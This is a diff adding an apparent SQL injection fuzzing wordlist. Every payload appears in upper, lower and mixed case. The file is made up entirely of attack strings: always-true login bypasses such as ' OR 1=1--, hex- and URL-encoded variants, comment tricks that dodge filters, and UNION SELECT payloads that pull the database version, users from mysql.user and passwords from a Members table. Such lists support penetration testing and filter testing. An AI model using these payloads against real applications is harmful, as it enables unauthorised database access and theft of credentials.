@@ -1,0 +1,258 @@
+\x27\x4F\x52 SELECT *
+\x27\x4F\x52 select *
+\x27\x4F\x52 Select *
+\x27\x6F\x72 SELECT *
+\x27\x6F\x72 select *
+\x27\x6F\x72 Select *
+'OR%20SELECT *
+'or%20select *
+'Or%20Select *
+'%20OR%20''='
+'%20or%20''='
+'%20Or%20''='
+'%20OR%20'x'='x
+'%20or%20'x'='x
+'%20Or%20'x'='x
+"%20OR%20"x"="x
+"%20or%20"x"="x
+"%20Or%20"x"="x
+')%20OR%20('x'='x
+')%20or%20('x'='x
+')%20Or%20('x'='x
+0 OR 1=1
+0 or 1=1
+0 Or 1=1
+' OR 0=0 --
+' or 0=0 --
+' Or 0=0 --
+" OR 0=0 --
+" or 0=0 --
+" Or 0=0 --
+OR 0=0 --
+or 0=0 --
+Or 0=0 --
+' OR 0=0 #
+' or 0=0 #
+' Or 0=0 #
+" OR 0=0 #
+" or 0=0 #
+" Or 0=0 #
+OR 0=0 #
+or 0=0 #
+Or 0=0 #
+' OR 1=1--
+' or 1=1--
+' Or 1=1--
+" OR 1=1--
+" or 1=1--
+" Or 1=1--
+' OR '1'='1'--
+' or '1'='1'--
+' Or '1'='1'--
+"' OR 1 --'"
+"' or 1 --'"
+"' Or 1 --'"
+OR 1=1--
+or 1=1--
+Or 1=1--
+OR%201=1
+or%201=1
+Or%201=1
+OR%201=1 --
+or%201=1 --
+Or%201=1 --
+' OR 1=1 OR ''='
+' or 1=1 or ''='
+' Or 1=1 Or ''='
+" OR 1=1 OR ""="
+" or 1=1 or ""="
+" Or 1=1 Or ""="
+' OR a=a--
+' or a=a--
+' Or a=a--
+" OR "a"="a
+" or "a"="a
+" Or "a"="a
+') OR ('a'='a
+') or ('a'='a
+') Or ('a'='a
+") OR ("a"="a
+") or ("a"="a
+") Or ("a"="a
+hi" OR "a"="a
+hi" or "a"="a
+hi" Or "a"="a
+hi" OR 1=1 --
+hi" or 1=1 --
+hi" Or 1=1 --
+hi' OR 1=1 --
+hi' or 1=1 --
+hi' Or 1=1 --
+hi' OR 'a'='a
+hi' or 'a'='a
+hi' Or 'a'='a
+hi') OR ('a'='a
+hi') or ('a'='a
+hi') Or ('a'='a
+hi") OR ("a"="a
+hi") or ("a"="a
+hi") Or ("a"="a
+'hi' OR 'x'='x';
+'hi' or 'x'='x';
+'hi' Or 'x'='x';
+PRINT
+print
+Print
+PRINT @@variable
+print @@variable
+Print @@variable
+SELECT
+select
+Select
+INSERT
+insert
+Insert
+OR
+or
+Or
+ORder by
+order by
+Order by
+DELETE
+delete
+Delete
+UPDATE
+update
+Update
+REPLACE
+replace
+Replace
+hANDler
+handler
+hAndler
+' OR username like '%
+' or username like '%
+' Or username like '%
+' OR uname like '%
+' or uname like '%
+' Or uname like '%
+' OR userid like '%
+' or userid like '%
+' Or userid like '%
+' OR uid like '%
+' or uid like '%
+' Or uid like '%
+' OR user like '%
+' or user like '%
+' Or user like '%
+--sp_passwORd
+--sp_password
+--sp_passwOrd
+\x27UNION SELECT
+\x27union select
+\x27Union Select
+' UNION SELECT
+' union select
+' Union Select
+' UNION ALL SELECT
+' union ALL select
+' Union ALL Select
+' OR (EXISTS)
+' or (EXISTS)
+' Or (EXISTS)
+' (SELECT top 1
+' (select top 1
+' (Select top 1
+1;SELECT%20*
+1;select%20*
+1;Select%20*
+'%20OR%201=1
+'%20or%201=1
+'%20Or%201=1
+%27%20OR%201=1
+%27%20or%201=1
+%27%20Or%201=1
+char%4039%41%2b%40SELECT
+char%4039%41%2b%40select
+char%4039%41%2b%40Select
+&apos;%20OR
+&apos;%20or
+&apos;%20Or
+' OR 1=1 OR ''='
+' or 1=1 or ''='
+' Or 1=1 Or ''='
+' OR ''='
+' or ''='
+' Or ''='
+x' OR 1=1 OR 'x'='y
+x' or 1=1 or 'x'='y
+x' Or 1=1 Or 'x'='y
+ ' AND 1=1--
+ ' and 1=1--
+ ' And 1=1--
+ ' OR 'a'='a
+ ' or 'a'='a
+ ' Or 'a'='a
+ ' AND 'c'='c
+ ' and 'c'='c
+ ' And 'c'='c
+ ' AND 1# 
+ ' and 1# 
+ ' And 1# 
+ ' OR '1
+ ' or '1
+ ' Or '1
+ ' OR 1--+
+ ' or 1--+
+ ' Or 1--+
+ " OR ""="
+ " or ""="
+ " Or ""="
+AND 1=1#
+and 1=1#
+And 1=1#
+AND 1
+and 1
+And 1
+AND TRUE = 1--
+and true = 1--
+And True = 1--
+AND 1*1
+and 1*1
+And 1*1
+AND 3-2 =0
+and 3-2 =0
+And 3-2 =0
+ ' UNION 1 --
+ ' union 1 --
+ ' Union 1 --
+ ' UNION 1,2 --
+ ' union 1,2 --
+ ' Union 1,2 --
+ ' UNION 1,2,3 --
+ ' union 1,2,3 --
+ ' Union 1,2,3 --
+ ' UNION 1,2,'a',4,5 -- 
+ ' union 1,2,'a',4,5 -- 
+ ' Union 1,2,'a',4,5 -- 
+ ' UNION 1,2,3,'a',5 --
+ ' union 1,2,3,'a',5 --
+ ' Union 1,2,3,'a',5 --
+-1' UNION SELECT 1,2,3,version(),0 #
+-1' union select 1,2,3,version(),0 #
+-1' Union Select 1,2,3,version(),0 #
+ -1' UNION SELECT 1,2,3,(SELECT version()),0 #
+ -1' union select 1,2,3,(select version()),0 #
+ -1' Union Select 1,2,3,(Select version()),0 #
+ -1' UNION SELECT 1,2,3,user FROM mysql.user #
+ -1' union select 1,2,3,user from mysql.user #
+ -1' Union Select 1,2,3,user From mysql.user #
+'passwORd'
+'password'
+'passwOrd'
+passwORd
+password
+passwOrd
+SELECT/*avoid-spaces*/passwORd/**/FROM/**/Members
+select/*avoid-spaces*/password/**/from/**/Members
+Select/*avoid-spaces*/passwOrd/**/From/**/Members
